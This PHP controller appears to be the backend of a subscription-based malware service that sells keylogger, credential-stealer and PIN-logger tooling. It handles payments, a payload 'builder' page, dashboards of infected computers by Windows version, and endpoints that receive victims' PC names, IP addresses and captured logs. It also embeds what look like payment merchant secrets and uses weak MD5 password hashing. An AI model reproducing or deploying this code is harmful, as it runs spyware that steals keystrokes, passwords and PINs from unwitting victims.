<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Main extends CI_Controller {

	function __construct()
	{
		parent::__construct();
		date_default_timezone_set('US/Central');
	}

	function index()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Define dates for the charts.
		$today = date('d-M-Y');
		$yesterday = date('d-M-Y', strtotime('-1 days'));
		$twodaysago = date('d-M-Y', strtotime('-2 days'));
		$threedaysago = date('d-M-Y', strtotime('-3 days'));

		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
			$data['expire'] = $UD->expiration_date;
		}
		// Get logs amount for today.
		$data['logsToday'] = $this->manage->logsChart($data['uid'], $today);
		// Get logs amount for yesterday.
		$data['logsYesterday'] = $this->manage->logsChart($data['uid'], $yesterday);
		// Get logs amount for two days ago.
		$data['logs2daysAgo'] = $this->manage->logsChart($data['uid'], $twodaysago);
 		// Get logs amount for three days ago.
 		$data['logs3daysAgo'] = $this->manage->logsChart($data['uid'], $threedaysago);
 		// Get logs amount for total.
 		$data['logsTotal'] = $this->manage->logsChart($data['uid'], 'total');

 		// Logs for XP.
 		$data['logstodayXP'] = $this->manage->PCChart($data['uid'], $today, 'Windows XP');
 		$data['logsyesterdayXP'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows XP');
 		$data['logs2daysagoXP'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows XP');
 		$data['logs3daysagoXP'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows XP');
 		$data['logstotalXP'] = $this->manage->PCChart($data['uid'], 'total', 'Windows XP');

 		// Logs for Vista.
 		$data['logstodayVista'] = $this->manage->PCChart($data['uid'], $today, 'Windows Vista');
 		$data['logsyesterdayVista'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows Vista');
 		$data['logs2daysagoVista'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows Vista');
 		$data['logs3daysagoVista'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows Vista');
 		$data['logstotalVista'] = $this->manage->PCChart($data['uid'], 'total', 'Windows Vista');

 		// Logs for Win 7.
 		$data['logstoday7'] = $this->manage->PCChart($data['uid'], $today, 'Windows 7');
 		$data['logsyesterday7'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 7');
 		$data['logs2daysago7'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 7');
 		$data['logs3daysago7'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 7');
 		$data['logstotal7'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 7');

 		// Logs for Win 8.
 		$data['logstoday8'] = $this->manage->PCChart($data['uid'], $today, 'Windows 8');
 		$data['logsyesterday8'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 8');
 		$data['logs2daysago8'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 8');
 		$data['logs3daysago8'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 8');
 		$data['logstotal8'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 8');

 		// Logs for unknown.
 		$data['logstodayUnknown'] = $this->manage->PCChart($data['uid'], $today, 'Unknown');
 		$data['logsyesterdayUnknown'] = $this->manage->PCChart($data['uid'], $yesterday, 'Unknown');
 		$data['logs2daysagoUnknown'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Unknown');
 		$data['logs3daysagoUnknown'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Unknown');
 		$data['logstotalUnknown'] = $this->manage->PCChart($data['uid'], 'total', 'Unknown');

		// Get keylogger log amount.
		$data['log_amount'] = $this->manage->getlogAmount($data['uid'], 0);
		// Get keylogged computers amount.
		$data['computer_amount'] = $this->manage->getPCAmount($data['uid']);
		// Load the index view and pass the $data array.
		$this->load->view('index', $data);
	}

    function subscribe()
    {
        include 'includes/ipn.php';
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user already has a subscription.
        if ($this->manage->hasSubscription()) {
            redirect('index', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }
        $data['ipn'] = new \PayPal\IPN(array(
            "business" => "siderow@ymail.com",
            "currency_code" => "USD"
        ));

        // Load the subscription view.
        $this->load->view('subscribe', $data);
    }

    function builder()
    {
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user has a subscription.
        if (!$this->manage->hasSubscription()) {
            redirect('subscribe', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }
        // Load the builder view.
        $this->load->view('builder', $data);
    }

	function logs()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 1);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Load the index view and pass the $data array.
		$this->load->view('logs', $data);	
	}

    function ipn($method)
    {
        error_reporting(0);
        // BTC Autobuy
        if ($method == 'btc') {

            $cp_merchant_id = 'd519eba1265d5b5e86d7e459c7cd7e4f';
            $cp_ipn_secret = 'V0d6WNxiSbzW8g5QYw2y';
            $cp_debug_email = 'admin@ispy.pw';

            $order_currency = 'USD';

            function errorAndDie($error_msg) {
                global $cp_debug_email;
                if (!empty($cp_debug_email)) {
                    $report = 'Error: '.$error_msg."\n\n";
                    $report .= "POST Data\n\n";
                    foreach ($_POST as $k => $v) {
                        $report .= "|$k| = |$v|\n";
                    }
                    mail($cp_debug_email, 'CoinPayments IPN Error', $report);
                }
                die('IPN Error: '.$error_msg);
            }

            if (!isset($_POST['ipn_mode']) || $_POST['ipn_mode'] != 'hmac') {
                errorAndDie('IPN Mode is not HMAC');
            }

            if (!isset($_SERVER['HTTP_HMAC']) || empty($_SERVER['HTTP_HMAC'])) {
                errorAndDie('No HMAC signature sent.');
            }

            $request = file_get_contents('php://input');
            if ($request === FALSE || empty($request)) {
                errorAndDie('Error reading POST data');
            }

            if (!isset($_POST['merchant']) || $_POST['merchant'] != trim($cp_merchant_id)) {
                errorAndDie('No or incorrect Merchant ID passed');
            }

            $hmac = hash_hmac("sha512", $request, trim($cp_ipn_secret));
            if ($hmac != $_SERVER['HTTP_HMAC']) {
                errorAndDie('HMAC signature does not match');
            }


            $txn_id = $_POST['txn_id'];
            $item_name = $_POST['item_name'];
            $item_number = $_POST['item_number'];
            $amount1 = floatval($_POST['amount1']);
            $amount2 = floatval($_POST['amount2']);
            $currency1 = $_POST['currency1'];
            $currency2 = $_POST['currency2'];
            $status = intval($_POST['status']);
            $status_text = $_POST['status_text'];
            $uid = trim($_POST['custom']);

            if ($currency1 != $order_currency) {
                errorAndDie('Original currency mismatch!');
            }

            if ($status >= 100 || $status == 2) {
                // 1 Month
                if ($amount1 == '15.0') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+30 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'BTC', $txn_id, $amount1, date('d-M-Y h:i:s'));
                }
                // 3 Months
                if ($amount1 == '28.0') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+90 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'BTC', $txn_id, $amount1, date('d-M-Y h:i:s'));
                }
                // 1 Year
                if ($amount1 == '60.0') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+365 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'BTC', $txn_id, $amount1, date('d-M-Y h:i:s'));
                }
            } else if ($status < 0) {
                //payment error, this is usually final but payments will sometimes be reopened if there was no exchange rate conversion or with seller consent
            } else {
                //payment is pending, you can optionally add a note to the order page
            }
            die('IPN OK');

        }
        // PayPal autobuy.
        if ($method == 'PayPal') {
            // Include the class file.
            include  'includes/ipn.php';
            $ipn = new \PayPal\IPN();
            $ipn->log = TRUE;
            $ipn->setSandbox(TRUE);
            if ($ipn->verify()) {

                // Retreive IPN variables.
                $ipnVariables = $ipn->getData();
                // Get UID
                $uid = $ipnVariables->custom;
                // Assign the amount paid to the paid variable.
                $paid = $ipnVariables->mc_gross;

                // Check if they paid enough for 1 month.
                if ($paid == '15.00') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+30 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'PayPal', $ipnVariables->txn_id, $paid, date('d-M-Y h:i:s'));
                }

                // Check if they paid enough for 3 months.
                if ($paid == '28.00') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+90 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'PayPal', $ipnVariables->txn_id, $paid, date('d-M-Y h:i:s'));
                }

                // Check if they paid enough for 1 year.
                if ($paid == '60.00') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+365 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'PayPal', $ipnVariables->txn_id, $paid, date('d-M-Y h:i:s'));
                }

            }
        }

    }

	function account()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Load the account view.
		$this->load->view('account', $data);	
	}

	function stealer()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 2);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Load the index view and pass the $data array.
		$this->load->view('stealer', $data);	
	}

	function pinlogger()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 3);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Load the index view and pass the $data array.
		$this->load->view('pinlogger', $data);	
	}

    function coupon()
    {
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $uid = $UD->uid;
        }
        // Set our form validation rules.
        $this->form_validation->set_rules('code', 'Code', 'required|trim|max_length[25]');
        // Run the form validation and check if it returned true.
        if ($this->form_validation->run()) {
            // Check if coupon is valid.
            $coupon = $this->manage->couponValid($this->input->post('code'));
            if ($coupon != false) {
                if ($coupon == 1) {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+30 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                } else if ($coupon == 2) {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+90 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                } else if ($coupon == 3) {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+365 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                }
                die('1');
            } else {
                die('0');
            }
        }
    }

	function login()
	{
		$data['invalid'] = false;
		$this->load->view('login', $data);
	}

	function register()
	{
		// Captcha
        $original_string = array_merge(range(0, 9), range('a', 'z'), range('A', 'Z'));
        $original_string = implode("", $original_string);
        $captcha = substr(str_shuffle($original_string), 0, 6);
        $vals = array(
            'word' => $captcha,
            'img_path' => 'captcha/',
            'img_url' => 'captcha/',
            'font_path' => BASEPATH.'fonts/texb.ttf',
            'img_width' => 120,
            'img_height' => 40,
            'expiration' => 7200
        );
        $cap = create_captcha($vals);
        $data['image'] = $cap['image'];
        $this->session->set_userdata(array('captcha'=>$captcha, 'image' => $cap['time'].'.jpg'));
		$this->load->view('register', $data);
	}

	function do_login()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('username', 'Username', 'required|trim');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|md5');
		$this->form_validation->set_error_delimiters('<li style="margin-left: 20px;">', '</li>');

		// Run the form validation and check if it returned true.
		if ($this->form_validation->run()) {
			// Check credentials.
			if ($this->manage->checkCredentials($this->input->post('username'), $this->input->post('password'))) {
				// Create our session data array.
				$sessionData = array(
					'username'	=> $this->input->post('username'),
					'logged_in' => true
				);
				// Set our session data.
				$this->session->set_userdata($sessionData);
				// Redirect to the dashboard.
				redirect('index', 'refresh');
				die();
			} else {
				// Login failed, load the login view.
				$data['invalid'] = true;
				$this->load->view('login', $data);
			}
		} else {
			$data['invalid'] = false;
			// Load the login view.
			$this->load->view('login', $data);
		}	
	}

	function checklogin()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('username', 'Username', 'required|trim');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|md5');
		$this->form_validation->set_rules('hwid', 'HWID', 'required|trim');


		// Run the form validation and check if it returned true.
		if ($this->form_validation->run()) {

			// Check the credentials.
			if ($this->manage->checkCredentials($this->input->post('username'), $this->input->post('password'))) {


				// Create our session data array.
				$sessionData = array(
					'username'	=> $this->input->post('username'),
					'logged_in' => true
				);
				// Set our session data.
				$this->session->set_userdata($sessionData);

				// Get encrypted HWID of the user.
				$encrypted_hwid = $this->manage->getHWID($this->input->post('username'));
                // Get decrypted HWID of the user.
                $decrypted_hwid = $this->encrypt->decode($encrypted_hwid);

				// Check if the HWID doesn't match the user account.
				if ($this->input->post('hwid') !== $decrypted_hwid) {
					die('4');
				}
				// Check if the user is banned.
				if ($this->manage->isBanned()) {
					die('2');
				} else
				// Check if the user has a subscription.
				if (!$this->manage->hasSubscription()) {
					die('3');
				} else
				if ($this->manage->hasSubscription()) {
					die('1' . $this->manage->getSubscription());
				}
			} else {
				die('0');
			}

		}
	}

	function do_register()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('username', 'Username', 'required|trim|max_length[15]|is_unique[users.username]');
		$this->form_validation->set_rules('email', 'Email Address', 'required|trim|valid_email|is_unique[users.email]');
		$this->form_validation->set_rules('hwid', 'HWID', 'required|trim');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|min_length[5]|md5');
		$this->form_validation->set_rules('cpassword', 'Confirm Password', 'required|trim|matches[password]');
		$this->form_validation->set_rules('captcha', 'Captcha', 'required|callback_verify_captcha');
		$this->form_validation->set_error_delimiters('<li style="margin-left: 20px;">', '</li>');

		// Run the form validation and see if it returned true.
		if ($this->form_validation->run()) {
			// Unique upload key function.
			function uniqueuploadKey($length = 32) {
    			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    			$randomString = '';
    			for ($i = 0; $i < $length; $i++) {
        			$randomString .= $characters[rand(0, strlen($characters) - 1)];
    			}
    			return $randomString;
			}
			// Create account.
			if ($this->manage->createAccount($this->input->post('username'), $this->input->post('email'), $this->input->post('password'), uniqueuploadKey(), $this->encrypt->encode($this->input->post('hwid')))) {
				// Update the registered variable to true.
				$data['registered'] = true;
				$data['invalid'] = false;
				// Load the login view.
				$this->load->view('login', $data);
			}	
		} else {
			// Captcha
        	$original_string = array_merge(range(0, 9), range('a', 'z'), range('A', 'Z'));
        	$original_string = implode("", $original_string);
        	$captcha = substr(str_shuffle($original_string), 0, 6);
        	$vals = array(
            	'word' => $captcha,
            	'img_path' => 'captcha/',
            	'img_url' => 'captcha/',
            	'font_path' => BASEPATH.'fonts/texb.ttf',
            	'img_width' => 120,
            	'img_height' => 40,
            	'expiration' => 7200
        	);
        	$cap = create_captcha($vals);
        	$data['image'] = $cap['image'];
        	$this->session->set_userdata(array('captcha'=>$captcha, 'image' => $cap['time'].'.jpg'));
			// Form validation failed, load the register view.
			$this->load->view('register', $data
				);
		}
	}

	function verify_captcha($captcha)
    {
        if ($this->session->userdata('captcha') == $captcha ) {
            return true;
        } else {
            $this->form_validation->set_message('verify_captcha', 'The characters you entered do not match the captcha.');
            return false;
        }
    }

    function terms()
    {
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user has a subscription.
        if (!$this->manage->hasSubscription()) {
            redirect('subscribe', 'refresh');
            die();
        }
        // Check if the user is an admin.
        if (!$this->manage->isAdmin()) {
            redirect('index', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }
        // Load the terms view.
        $this->load->view('terms', $data);
    }

    function admin($page)
    {
        error_reporting(0);
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user has a subscription.
        if (!$this->manage->hasSubscription()) {
            redirect('subscribe', 'refresh');
            die();
        }
        // Check if the user is an admin.
        if (!$this->manage->isAdmin()) {
            redirect('index', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }

        // Pages.
        if ($page == 'overview') {
            // Get user count.
            $data['user_count'] = $this->manage->userCount();
            // Get total made.
            $data['total_made'] = $this->manage->totalMade();
            // Load the overview view.
            $this->load->view('overview', $data);
        } else if ($page == 'users') {
            // Get user list.
            $data['users'] = $this->manage->getUsers();
            // Load the users view.
            $this->load->view('users', $data);
        } else if ($page == 'settings') {

        } else {
            redirect('index', 'refresh');
            die();
        }

    }

    function update($type) 
    {
    	// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Generate new upload key.
		if ($type == 'key')	{
			// Unique upload key function.
			function uniqueuploadKey($length = 32) {
    			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    			$randomString = '';
    			for ($i = 0; $i < $length; $i++) {
        			$randomString .= $characters[rand(0, strlen($characters) - 1)];
    			}
    			return $randomString;
			}
			if ($this->manage->generateKey(uniqueuploadKey())) {
				$data['updated_key'] = true;
				redirect('account#updated_key', 'refresh');
				die();
			}
		}
		// Update password.
		if ($type == 'password') {
			// Set our form validation rules.
			$this->form_validation->set_rules('new_password', 'New Password', 'required|trim|md5');
			$this->form_validation->set_rules('repeat_password', 'Repeat Password', 'required|trim|matches[new_password]');
			$this->form_validation->set_rules('cur_pass', 'Current Password', 'required|trim|md5|callback_checkPassword');
			// Run the form validation and check if it returned true.
			if ($this->form_validation->run()) {
                // Change password.
                if ($this->manage->changePassword($this->input->post('new_password'))) {
                    redirect('account#password', 'refresh');
                    die();
                } else {
                    redirect('account#error', 'refresh');
                    die();
                }
			} else {
				redirect('account#error', 'refresh');
                die();
			}
		}
        // Update email.
        if ($type == 'email') {
            // Set our form validation rules.
            $this->form_validation->set_rules('new_email', 'New Email', 'required|trim|valid_email|is_unique[users.email]');
            $this->form_validation->set_rules('repeat_email', 'Repeat Email', 'required|trim|matches[new_email]');
            $this->form_validation->set_rules('cur_pass_email', 'Current Password', 'required|trim|md5|callback_checkPassword');
            // Run the form validation and check if it returned true.
            if ($this->form_validation->run()) {
                // Change email.
                if ($this->manage->changeEmail($data['uid'], $this->input->post('new_email'))) {
                    redirect('account#email', 'refresh');
                    die();
                } else {
                    redirect('account#error', 'refresh');
                    die();
                }
            } else {
                redirect('account#error', 'refresh');
                die();
            }
        }
    }

    function checkPassword($password)
    {
        if ($this->manage->checkCredentials($this->session->userdata('username'), $password)) {
            return true;
        } else {
            $this->form_validation->set_message('checkPassword', 'The password you entered does not match your current one.');
        }
    }

    function install()
    {
    	// Set our form validation rules.
    	$this->form_validation->set_rules('key', 'Upload Key', 'required|trim|callback_checkKey');
    	$this->form_validation->set_rules('os', 'Operating System', 'required|trim');
    	$this->form_validation->set_rules('pcname', 'PC Name', 'required|trim');

    	if ($this->form_validation->run()) {

    		// Get the UID of the given key.
    		$uid = trim($this->manage->getUIDfromKey($this->input->post('key')));

    		// Add the computer.
    		if ($this->manage->addInstallation($uid, $this->input->post('key'), $this->input->post('os'), $this->input->post('pcname'), $this->input->ip_address(), date('d-M-Y '), date('d-M-Y h:i:s'))) {
    			die('ok');
    		}
    	}	
    }

	function insert()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('key', 'Upload key', 'required|trim|callback_checkKey');
		$this->form_validation->set_rules('type', 'Type of log', 'required|trim');
		$this->form_validation->set_rules('pcname', 'PC name', 'required|trim');
		$this->form_validation->set_rules('log', 'Log', 'required|trim');

		if ($this->form_validation->run()) {

			// Get the UID of the given key.
			$uid = trim($this->manage->getUIDfromKey($this->input->post('key')));

			// Unique key function.
			function uniquelogKey($length = 32) {
    			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    			$randomString = '';
    			for ($i = 0; $i < $length; $i++) {
        			$randomString .= $characters[rand(0, strlen($characters) - 1)];
    			}
    			return $randomString;
			}

			// Add perm log.
			$this->manage->addpermLog($uid, date('d-M-Y'));

			// Add the log.
			if ($this->manage->addLog($uid, uniquelogKey(), $this->input->post('key'), $this->input->post('type'), $this->input->post('pcname'), $this->input->ip_address(), $this->input->post('log'), date('d-M-Y'), date('d-M-Y h:i:s'))) {
				die('ok');
			}

		}

	}

	function delete($key)
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Trim the ID.
		$key = trim($key);
		// Check if the given ID exists.
		if (!$this->manage->logExists($key)) {
			redirect('logs', 'refresh');
			die();
		}
		// Check if the user owns the log.
		if (!$this->manage->ownsLog($key, $data['uid'])) {
			redirect('logs', 'refresh');
			die();
		}
		// Delete log.
		if ($this->manage->deleteLog($key)) {
			redirect($_SERVER['HTTP_REFERER'], 'refresh');
			die();
		}
			
	}

	function view($key)
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Trim the ID.
		$key = trim($key);
		// Check if the given ID exists.
		if (!$this->manage->logExists($key)) {
			redirect('logs', 'refresh');
			die();
		}
		// Check if the user owns the log.
		if (!$this->manage->ownsLog($key, $data['uid'])) {
			redirect('logs', 'refresh');
			die();
		}
		// Get log.
		$logs = $this->manage->getLog($key);
		foreach ($logs as $log) {
			$data['pcname'] = $log->pcname;
			$data['ip'] = $log->ip;
			$data['time'] = $log->time;
			$data['log'] = $log->log;
			$data['key'] = $log->unique_key;
			$data['type'] = $log->type;
		}
		// Load the index view and pass the $data array.
		$this->load->view('view', $data);	
	}

	function checkKey($key)
	{
		// Trim the key.
		$key = trim($key);
		if ($this->manage->validKey($key)) {
			// Key is correct.
			return true;
		} else {
			// Key is invalid.
			return false;
		}
	}

	function logout()
	{
		if ($this->session->userdata('logged_in')) {
			$this->session->userdata = array();
            $this->session->sess_destroy();
            redirect('login', 'refresh');
            die('Forbidden.');
		}
	}
}
